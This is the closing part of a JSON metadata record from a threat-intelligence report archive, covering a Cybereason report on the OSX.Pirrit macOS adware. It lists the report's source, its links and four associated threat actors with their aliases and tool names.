ABOUT THE AUTHOR\n\n## AUTHOR\n\n###### AMIT SERPER\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.cybereason.com/hubfs/Content%20PDFs/OSX.Pirrit%20Part%20III%20The%20DaVinci%20Code.pdf"
    ],
    "report_names": [
        "OSX.Pirrit%20Part%20III%20The%20DaVinci%20Code.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1f6ae238-765f-4495-9d54-6a7883d7a319",
            "created_at": "2022-10-25T16:07:24.573456Z",
            "updated_at": "2025-03-27T02:02:10.284644Z",
            "deleted_at": null,
            "main_name": "TA511",
            "aliases": [
                "MAN1",
                "Moskalvzapoe"
            ],
            "source_name": "ETDA:TA511",
            "tools": [
                "Agentemis",
                "Chanitor",
                "Cobalt Strike",
                "CobaltStrike",
                "Ficker Stealer",
                "Hancitor",
                "NetSupport",
                "NetSupport Manager",
                "NetSupport Manager RAT",
                "NetSupport RAT",
                "NetSupportManager RAT",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "542cf9d0-9c68-428c-aff8-81b6f59dc985",
            "created_at": "2023-02-15T02:01:49.554105Z",
            "updated_at": "2025-03-27T02:00:03.110991Z",
            "deleted_at": null,
            "main_name": "Moskalvzapoe",
            "aliases": [
                "MAN1",
                "TA511"
            ],
            "source_name": "MISPGALAXY:Moskalvzapoe",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041592,
    "ts_creation_date": 1512742770,
    "ts_modification_date": 1513076779,
    "files": {
        "pdf": "https://archive.orkl.eu/2a2ac961ca40929099c49b5a1aa82769486feafe.pdf",
        "text": "https://archive.orkl.eu/2a2ac961ca40929099c49b5a1aa82769486feafe.txt",
        "img": "https://archive.orkl.eu/2a2ac961ca40929099c49b5a1aa82769486feafe.jpg"
    }
}